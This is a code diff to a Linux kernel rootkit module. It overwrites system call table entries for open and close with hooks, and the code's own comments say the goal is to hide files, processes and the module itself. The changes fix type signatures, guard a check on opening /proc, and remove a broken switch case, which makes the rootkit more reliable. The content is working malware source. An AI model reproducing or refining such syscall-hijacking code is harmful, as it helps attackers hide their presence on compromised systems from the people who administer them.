@@ -75,7 +75,7 @@ u_int8_t hide_files_flag;
 /* To store a pointer to original close() */
 asmlinkage int (*original_close)(int fd);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-asmlinkage int (*original_open)(const char __user *pathname, int flags, int mode);
+asmlinkage long (*original_open)(const char __user *pathname, int flags, mode_t mode);
 
 int hide_files(void)
 {
@@ -303,13 +303,13 @@ out:
     return ret;
 }
 
-asmlinkage int my_open(const char __user *pathname, int flags, int mode)
+asmlinkage long my_open(const char __user *pathname, int flags, mode_t mode)
 {
-    int fd;
+    long fd;
     //printk("Hijacked open called\n");
     fd = original_open(pathname, flags, mode);
     
-    if (is_proc(pathname)) {
+    if (fd >= 0 && is_proc(pathname)) {
         /* opened "/proc";
            store the process's pid and opened fd
            we'll use these in getdents to hide processes */
@@ -348,8 +348,6 @@ asmlinkage int my_close(int fd)
         case SHOW_MODULE:
             show_module();
             break;
-        case default:
-            err = original_close(fd);
         }
     }
     else {
@@ -424,7 +422,7 @@ int rootkit_init(void)
     syscall_table[__NR_close] = (void *) my_close;
 
     // hijack open system call
-    original_open = (asmlinkage int (*)(const char *, int, int)) syscall_table[__NR_open];
+    original_open = (asmlinkage long (*)(const char *, int, mode_t)) syscall_table[__NR_open];
     syscall_table[__NR_open] = (void *) my_open;
     /*
     // hijack getdents system call
